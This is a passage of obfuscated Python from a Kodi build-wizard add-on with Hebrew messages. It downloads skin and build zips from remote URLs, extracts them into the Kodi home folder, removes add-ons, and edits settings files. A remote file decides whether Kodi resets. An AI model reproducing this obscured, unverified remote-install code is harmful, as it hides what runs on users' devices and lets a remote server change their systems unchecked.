		if OO0O000O00OO0OO0O ==True :#line:4141
			O00OOOO0OO00OO0O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4142
			if len (O00OOOO0OO00OO0O0 )>0 :#line:4143
				O0OO0OO00000000OO ='%s-%s.zip'%(SKINID18 ,O00OOOO0OO00OO0O0 [0 ])#line:4144
				OO0OO0O00O0O00000 =wiz .workingURL (SKIN18ZIPURL +O0OO0OO00000000OO )#line:4145
				if OO0OO0O00O0O00000 ==True :#line:4146
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4147
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4148
					O0000O0OOOO00OO0O =os .path .join (PACKAGES ,O0OO0OO00000000OO )#line:4149
					try :os .remove (O0000O0OOOO00OO0O )#line:4150
					except :pass #line:4151
					downloader .download (SKIN18ZIPURL +O0OO0OO00000000OO ,O0000O0OOOO00OO0O ,DP )#line:4152
					extract .all (O0000O0OOOO00OO0O ,HOME ,DP )#line:4153
					try :#line:4154
						OO000O0OOOOOOO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4155
						OOOO000OOOO00O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4156
						os .rename (OO000O0OOOOOOO00O ,OOOO000OOOO00O0OO )#line:4157
					except :#line:4158
						pass #line:4159
					try :#line:4160
						O0OO0O0000OO00OOO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOOOO00000OOO00 =O0OO0O0000OO00OOO .read ();O0OO0O0000OO00OOO .close ()#line:4161
						O0OOOOO0OO0O0O0OO =wiz .parseDOM (O0OOOOO00000OOO00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4162
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOO0OO0O0O0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4163
					except :#line:4164
						pass #line:4165
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4166
					DP .close ()#line:4167
					xbmc .sleep (500 )#line:4168
					wiz .forceUpdate (True )#line:4169
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4170
				else :#line:4171
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4172
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OO0O00O0O00000 ,xbmc .LOGERROR )#line:4173
			else :#line:4174
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4175
		else :#line:4176
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4177
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4178
def skinfix17 ():#line:4179
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4180
		OOO0O0OOO0OO00OOO =wiz .workingURL (SKINID17DDONXML )#line:4181
		if OOO0O0OOO0OO00OOO ==True :#line:4182
			OO0OOOOO0OOOOOO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4183
			if len (OO0OOOOO0OOOOOO00 )>0 :#line:4184
				O0O0O0O0O00O0OO00 ='%s-%s.zip'%(SKINID17 ,OO0OOOOO0OOOOOO00 [0 ])#line:4185
				OO0000O0OO00OOO00 =wiz .workingURL (SKIN17ZIPURL +O0O0O0O0O00O0OO00 )#line:4186
				if OO0000O0OO00OOO00 ==True :#line:4187
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4188
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4189
					O0OOOO0OOO0OO000O =os .path .join (PACKAGES ,O0O0O0O0O00O0OO00 )#line:4190
					try :os .remove (O0OOOO0OOO0OO000O )#line:4191
					except :pass #line:4192
					downloader .download (SKIN17ZIPURL +O0O0O0O0O00O0OO00 ,O0OOOO0OOO0OO000O ,DP )#line:4193
					extract .all (O0OOOO0OOO0OO000O ,HOME ,DP )#line:4194
					try :#line:4195
						O00O0O0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4196
						OOOOO00OOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4197
						os .rename (O00O0O0O0OO0000O0 ,OOOOO00OOOOOOO0OO )#line:4198
					except :#line:4199
						pass #line:4200
					try :#line:4201
						OOOO0OOO0000O0O0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0O000OOOOOOO0OO =OOOO0OOO0000O0O0O .read ();OOOO0OOO0000O0O0O .close ()#line:4202
						O0OO0000OO00OOO00 =wiz .parseDOM (OO0O000OOOOOOO0OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4203
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000OO00OOO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4204
					except :#line:4205
						pass #line:4206
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4207
					DP .close ()#line:4208
					xbmc .sleep (500 )#line:4209
					wiz .forceUpdate (True )#line:4210
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4211
				else :#line:4212
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4213
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0000O0OO00OOO00 ,xbmc .LOGERROR )#line:4214
			else :#line:4215
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4216
		else :#line:4217
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4218
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4219
def fix17update ():#line:4220
	if KODIV >=17 and KODIV <18 :#line:4221
		wiz .kodi17Fix ()#line:4222
		xbmc .sleep (4000 )#line:4223
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4224
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4225
		fixfont ()#line:4226
		O0OO0O0O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4227
		try :#line:4229
			O0OO000O0000000O0 =open (O0OO0O0O00O0O0OO0 ,'r')#line:4230
			OOOO000O0O000OOOO =O0OO000O0000000O0 .read ()#line:4231
			O0OO000O0000000O0 .close ()#line:4232
			O0O000O0OOOOO000O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4233
			OO00OO0O0000OOO0O =re .compile (O0O000O0OOOOO000O ).findall (OOOO000O0O000OOOO )[0 ]#line:4234
			O0OO000O0000000O0 =open (O0OO0O0O00O0O0OO0 ,'w')#line:4235
			O0OO000O0000000O0 .write (OOOO000O0O000OOOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO00OO0O0000OOO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4236
			O0OO000O0000000O0 .close ()#line:4237
		except :#line:4238
				pass #line:4239
		wiz .kodi17Fix ()#line:4240
		O0OO0O0O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4241
		try :#line:4242
			O0OO000O0000000O0 =open (O0OO0O0O00O0O0OO0 ,'r')#line:4243
			OOOO000O0O000OOOO =O0OO000O0000000O0 .read ()#line:4244
			O0OO000O0000000O0 .close ()#line:4245
			O0O000O0OOOOO000O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4246
			OO00OO0O0000OOO0O =re .compile (O0O000O0OOOOO000O ).findall (OOOO000O0O000OOOO )[0 ]#line:4247
			O0OO000O0000000O0 =open (O0OO0O0O00O0O0OO0 ,'w')#line:4248
			O0OO000O0000000O0 .write (OOOO000O0O000OOOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO00OO0O0000OOO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4249
			O0OO000O0000000O0 .close ()#line:4250
		except :#line:4251
				pass #line:4252
		swapSkins ('skin.Premium.mod')#line:4253
def fix18update ():#line:4255
	if KODIV >=18 :#line:4256
		xbmc .sleep (4000 )#line:4257
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4258
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4259
		fixfont ()#line:4260
		O0OOOO00O0OOO00O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4261
		try :#line:4262
			OO0O00O000OOO0O00 =open (O0OOOO00O0OOO00O0 ,'r')#line:4263
			O00O000000OOO0O0O =OO0O00O000OOO0O00 .read ()#line:4264
			OO0O00O000OOO0O00 .close ()#line:4265
			O0OO00000000OOO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4266
			OOOOOOOOO00000OO0 =re .compile (O0OO00000000OOO00 ).findall (O00O000000OOO0O0O )[0 ]#line:4267
			OO0O00O000OOO0O00 =open (O0OOOO00O0OOO00O0 ,'w')#line:4268
			OO0O00O000OOO0O00 .write (O00O000000OOO0O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOOOOOOO00000OO0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4269
			OO0O00O000OOO0O00 .close ()#line:4270
		except :#line:4271
				pass #line:4272
		wiz .kodi17Fix ()#line:4273
		O0OOOO00O0OOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4274
		try :#line:4275
			OO0O00O000OOO0O00 =open (O0OOOO00O0OOO00O0 ,'r')#line:4276
			O00O000000OOO0O0O =OO0O00O000OOO0O00 .read ()#line:4277
			OO0O00O000OOO0O00 .close ()#line:4278
			O0OO00000000OOO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4279
			OOOOOOOOO00000OO0 =re .compile (O0OO00000000OOO00 ).findall (O00O000000OOO0O0O )[0 ]#line:4280
			OO0O00O000OOO0O00 =open (O0OOOO00O0OOO00O0 ,'w')#line:4281
			OO0O00O000OOO0O00 .write (O00O000000OOO0O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOOOOOOO00000OO0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4282
			OO0O00O000OOO0O00 .close ()#line:4283
		except :#line:4284
				pass #line:4285
		swapSkins ('skin.Premium.mod')#line:4286
def buildWizard (OO0OOO0OOO00O00O0 ,O00OOOOO00000O0OO ,theme =None ,over =False ):#line:4289
	OOO0O000OO0O00O0O =xbmcgui .DialogBusy ()#line:4290
	OOO0O000OO0O00O0O .create ()#line:4291
	if over ==False :#line:4292
		O00000O0OOO000OO0 =wiz .checkBuild (OO0OOO0OOO00O00O0 ,'url')#line:4293
		if USERNAME =='':#line:4294
			ADDON .openSettings ()#line:4295
			sys .exit ()#line:4296
		if PASSWORD =='':#line:4297
			ADDON .openSettings ()#line:4298
			sys .exit ()#line:4299
		if BUILDNAME =='':#line:4301
			O000O0O00OO0OO000 =u_list (SPEEDFILE )#line:4302
			(O000O0O00OO0OO000 )#line:4303
		if O00000O0OOO000OO0 ==False :#line:4304
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4309
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4310
			return #line:4311
		O0OOO00O0OOOO0OO0 =wiz .workingURL (O00000O0OOO000OO0 )#line:4312
		if O0OOO00O0OOOO0OO0 ==False :#line:4313
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOO00O0OOOO0OO0 ))#line:4314
			return #line:4315
	if O00OOOOO00000O0OO =='gui':#line:4316
		if OO0OOO0OOO00O00O0 ==BUILDNAME :#line:4317
			if over ==True :OOO00O0OO00O00O00 =1 #line:4318
			else :OOO00O0OO00O00O00 =1 #line:4319
		else :#line:4320
			OOO00O0OO00O00O00 =1 #line:4321
		if OOO00O0OO00O00O00 :#line:4322
			remove_addons ()#line:4323
			remove_addons2 ()#line:4324
			debridit .debridIt ('update','all')#line:4325
			traktit .traktIt ('update','all')#line:4326
			OO0O00O000OO0OOO0 =wiz .checkBuild (OO0OOO0OOO00O00O0 ,'gui')#line:4327
			OO0O0000O0O0OO000 =OO0OOO0OOO00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4328
			if not wiz .workingURL (OO0O00O000OO0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4329
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4330
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 ),'','אנא המתן')#line:4331
			OOO0OO0O000O0O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0000O0O0OO000 )#line:4332
			try :os .remove (OOO0OO0O000O0O0OO )#line:4333
			except :pass #line:4334
			logging .warning (OO0O00O000OO0OOO0 )#line:4335
			if 'google'in OO0O00O000OO0OOO0 :#line:4336
			   OO0OO00OOOO0OO0O0 =googledrive_download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'filesize'))#line:4337
			else :#line:4340
			  downloader .download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP )#line:4341
			xbmc .sleep (100 )#line:4342
			OO00OOOO0O000O00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 )#line:4343
			DP .update (0 ,OO00OOOO0O000O00O ,'','אנא המתן')#line:4344
			extract .all (OOO0OO0O000O0O0OO ,HOME ,DP ,title =OO00OOOO0O000O00O )#line:4345
			DP .close ()#line:4346
			wiz .defaultSkin ()#line:4347
			wiz .lookandFeelData ('save')#line:4348
			try :#line:4349
				telemedia_android5fix ()#line:4350
			except :pass #line:4351
			wiz .kodi17Fix ()#line:4352
			if KODIV >=18 :#line:4353
				skindialogsettind18 ()#line:4354
			debridit .debridIt ('restore','all')#line:4355
			traktit .traktIt ('restore','all')#line:4356
			if INSTALLMETHOD ==1 :O000000OOO000OOO0 =1 #line:4358
			elif INSTALLMETHOD ==2 :O000000OOO000OOO0 =0 #line:4359
			else :DP .close ()#line:4360
			OO0O0OOOOOO0000O0 =(NOTIFICATION2 )#line:4361
			OOO00O0O00O00OOOO =urllib2 .urlopen (OO0O0OOOOOO0000O0 )#line:4362
			OO0OOO00O0OOO0OO0 =OOO00O0O00O00OOOO .readlines ()#line:4363
			O00OO0O0OO0000OO0 =0 #line:4364
			for O0OOO000OO00O00OO in OO0OOO00O0OOO0OO0 :#line:4367
				if O0OOO000OO00O00OO .split (' ==')[0 ]=="noreset"or O0OOO000OO00O00OO .split ()[0 ]=="noreset":#line:4368
					xbmc .executebuiltin ("ReloadSkin()")#line:4370
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4371
					update_Votes ()#line:4372
					indicatorfastupdate ()#line:4373
				if O0OOO000OO00O00OO .split (' ==')[0 ]=="reset"or O0OOO000OO00O00OO .split ()[0 ]=="reset":#line:4374
					update_Votes ()#line:4376
					indicatorfastupdate ()#line:4377
					resetkodi ()#line:4378
		else :#line:4387
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4388
	if O00OOOOO00000O0OO =='gui2':#line:4389
		if OO0OOO0OOO00O00O0 ==BUILDNAME :#line:4390
			if over ==True :OOO00O0OO00O00O00 =1 #line:4391
			else :OOO00O0OO00O00O00 =1 #line:4392
		else :#line:4393
			OOO00O0OO00O00O00 =1 #line:4394
		if OOO00O0OO00O00O00 :#line:4395
			remove_addons ()#line:4396
			remove_addons2 ()#line:4397
			OO0O00O000OO0OOO0 =wiz .checkBuild (OO0OOO0OOO00O00O0 ,'gui')#line:4398
			OO0O0000O0O0OO000 =OO0OOO0OOO00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4399
			if not wiz .workingURL (OO0O00O000OO0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4400
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4401
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 ),'','אנא המתן')#line:4402
			OOO0OO0O000O0O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0000O0O0OO000 )#line:4403
			try :os .remove (OOO0OO0O000O0O0OO )#line:4404
			except :pass #line:4405
			logging .warning (OO0O00O000OO0OOO0 )#line:4406
			if 'google'in OO0O00O000OO0OOO0 :#line:4407
			   OO0OO00OOOO0OO0O0 =googledrive_download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'filesize'))#line:4408
			else :#line:4411
			  downloader .download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP )#line:4412
			xbmc .sleep (100 )#line:4413
			OO00OOOO0O000O00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 )#line:4414
			DP .update (0 ,OO00OOOO0O000O00O ,'','אנא המתן')#line:4415
			extract .all (OOO0OO0O000O0O0OO ,HOME ,DP ,title =OO00OOOO0O000O00O )#line:4416
			DP .close ()#line:4417
			wiz .defaultSkin ()#line:4418
			wiz .lookandFeelData ('save')#line:4419
			if INSTALLMETHOD ==1 :O000000OOO000OOO0 =1 #line:4422
			elif INSTALLMETHOD ==2 :O000000OOO000OOO0 =0 #line:4423
			else :DP .close ()#line:4424
		else :#line:4426
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4427
	elif O00OOOOO00000O0OO =='fresh':#line:4428
		freshStart (OO0OOO0OOO00O00O0 )#line:4429
	elif O00OOOOO00000O0OO =='normal':#line:4430
		if url =='normal':#line:4431
			if KEEPTRAKT =='true':#line:4432
				traktit .autoUpdate ('all')#line:4433
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4434
			if KEEPREAL =='true':#line:4435
				debridit .autoUpdate ('all')#line:4436
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4437
			if KEEPLOGIN =='true':#line:4438
				loginit .autoUpdate ('all')#line:4439
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4440
		O0O0OOO0OOOO00OOO =int (KODIV );O0O0O00OOOO0OOOOO =int (float (wiz .checkBuild (OO0OOO0OOO00O00O0 ,'kodi')))#line:4441
		if not O0O0OOO0OOOO00OOO ==O0O0O00OOOO0OOOOO :#line:4442
			if O0O0OOO0OOOO00OOO ==16 and O0O0O00OOOO0OOOOO <=15 :OO0O0O0O00OOO0O00 =False #line:4443
			else :OO0O0O0O00OOO0O00 =True #line:4444
		else :OO0O0O0O00OOO0O00 =False #line:4445
		if OO0O0O0O00OOO0O00 ==True :#line:4446
			O0O00000O00OOOOOO =1 #line:4447
		else :#line:4448
			if not over ==False :O0O00000O00OOOOOO =1 #line:4449
			else :O0O00000O00OOOOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4450
		if O0O00000O00OOOOOO :#line:4451
			wiz .clearS ('build')#line:4452
			OO0O00O000OO0OOO0 =wiz .checkBuild (OO0OOO0OOO00O00O0 ,'url')#line:4453
			OO0O0000O0O0OO000 =OO0OOO0OOO00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4454
			if not wiz .workingURL (OO0O00O000OO0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4455
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4456
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'version')),'','אנא המתן')#line:4457
			OOO0OO0O000O0O0OO =os .path .join (PACKAGES ,'%s.zip'%OO0O0000O0O0OO000 )#line:4458
			try :os .remove (OOO0OO0O000O0O0OO )#line:4459
			except :pass #line:4460
			logging .warning (OO0O00O000OO0OOO0 )#line:4461
			if 'google'in OO0O00O000OO0OOO0 :#line:4462
			   OO0OO00OOOO0OO0O0 =googledrive_download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'filesize'))#line:4463
			else :#line:4466
			  downloader .download (OO0O00O000OO0OOO0 ,OOO0OO0O000O0O0OO ,DP )#line:4467
			xbmc .sleep (1000 )#line:4468
			OO00OOOO0O000O00O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'version'))#line:4469
			DP .update (0 ,OO00OOOO0O000O00O ,'','אנא המתן...')#line:4470
			O0OOOO0OO00OO00O0 ,OOO0O0OOOO0OO0O0O ,OO0O000O00O0O00O0 =extract .all (OOO0OO0O000O0O0OO ,HOME ,DP ,title =OO00OOOO0O000O00O )#line:4471
			if int (float (O0OOOO0OO00OO00O0 ))>0 :#line:4472
				try :#line:4473
					wiz .fixmetas ()#line:4474
				except :pass #line:4475
				wiz .lookandFeelData ('save')#line:4476
				wiz .defaultSkin ()#line:4477
				wiz .setS ('buildname',OO0OOO0OOO00O00O0 )#line:4479
				wiz .setS ('buildversion',wiz .checkBuild (OO0OOO0OOO00O00O0 ,'version'))#line:4480
				wiz .setS ('buildtheme','')#line:4481
				wiz .setS ('latestversion',wiz .checkBuild (OO0OOO0OOO00O00O0 ,'version'))#line:4482
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4483
				wiz .setS ('installed','true')#line:4484
				wiz .setS ('extract',str (O0OOOO0OO00OO00O0 ))#line:4485
				wiz .setS ('errors',str (OOO0O0OOOO0OO0O0O ))#line:4486
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOOO0OO00OO00O0 ,OOO0O0OOOO0OO0O0O ))#line:4487
				fastupdatefirstbuild (NOTEID )#line:4488
				try :#line:4489
					telemedia_android5fix ()#line:4490
				except :pass #line:4491
				wiz .kodi17Fix ()#line:4492
				skin_homeselect ()#line:4493
				kodi17to18 ()#line:4499
				try :os .remove (OOO0OO0O000O0O0OO )#line:4501
				except :pass #line:4502
				DP .close ()#line:4522
				O000OOO0OOOOOO00O =wiz .themeCount (OO0OOO0OOO00O00O0 )#line:4523
				builde_Votes ()#line:4524
				indicator ()#line:4525
				if not O000OOO0OOOOOO00O ==False :#line:4526
					buildWizard (OO0OOO0OOO00O00O0 ,'theme')#line:4527
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4528
				if INSTALLMETHOD ==1 :O000000OOO000OOO0 =1 #line:4529
				elif INSTALLMETHOD ==2 :O000000OOO000OOO0 =0 #line:4530
				else :resetkodi ()#line:4531
				if O000000OOO000OOO0 ==1 :wiz .reloadFix ()#line:4533
				else :wiz .killxbmc (True )#line:4534
			else :#line:4535
				if isinstance (OOO0O0OOOO0OO0O0O ,unicode ):#line:4536
					OO0O000O00O0O00O0 =OO0O000O00O0O00O0 .encode ('utf-8')#line:4537
				O00O000O0OOO00OOO =open (OOO0OO0O000O0O0OO ,'r')#line:4538
				O00O000O0OO000O0O =O00O000O0OOO00OOO .read ()#line:4539
				OOO00O00O0OOO000O =''#line:4540
				for OOO0O0000OO0OOOO0 in OO0OO00OOOO0OO0O0 :#line:4541
				  OOO00O00O0OOO000O ='key: '+OOO00O00O0OOO000O +'\n'+OOO0O0000OO0OOOO0 #line:4542
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O000O00O0O00O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO00O00O0OOO000O )#line:4543
		else :#line:4544
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4545
	elif O00OOOOO00000O0OO =='theme':#line:4546
		if theme ==None :#line:4547
			O000OOO0OOOOOO00O =wiz .checkBuild (OO0OOO0OOO00O00O0 ,'theme')#line:4548
			O0O0OOO0O0OO0O00O =[]#line:4549
			if not O000OOO0OOOOOO00O =='http://'and wiz .workingURL (O000OOO0OOOOOO00O )==True :#line:4550
				O0O0OOO0O0OO0O00O =wiz .themeCount (OO0OOO0OOO00O00O0 ,False )#line:4551
				if len (O0O0OOO0O0OO0O00O )>0 :#line:4552
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0OOO0OOO00O00O0 ,COLOR1 ,len (O0O0OOO0O0OO0O00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4553
						wiz .log ("Theme List: %s "%str (O0O0OOO0O0OO0O00O ))#line:4554
						OOO00O0OOO0O00000 =DIALOG .select (ADDONTITLE ,O0O0OOO0O0OO0O00O )#line:4555
						wiz .log ("Theme install selected: %s"%OOO00O0OOO0O00000 )#line:4556
						if not OOO00O0OOO0O00000 ==-1 :theme =O0O0OOO0O0OO0O00O [OOO00O0OOO0O00000 ];O0O000O0OOOO00O0O =True #line:4557
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4558
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4559
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4560
		else :O0O000O0OOOO00O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0OOO0OOO00O00O0 ,wiz .checkBuild (OO0OOO0OOO00O00O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4561
		if O0O000O0OOOO00O0O :#line:4562
			O00OO0O0OOO0OOO0O =wiz .checkTheme (OO0OOO0OOO00O00O0 ,theme ,'url')#line:4563
